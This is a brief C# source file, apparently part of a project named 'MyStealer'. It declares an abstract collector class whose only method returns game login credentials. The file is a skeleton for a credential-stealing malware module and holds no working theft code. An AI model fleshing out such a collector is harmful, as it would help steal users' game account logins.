using System.Collections.Immutable;

namespace MyStealer.Collectors.Game
{
    public abstract class GameCollector : ModuleBase
    {
        public abstract IImmutableSet<GameLogin> GetLogins();
    }
}
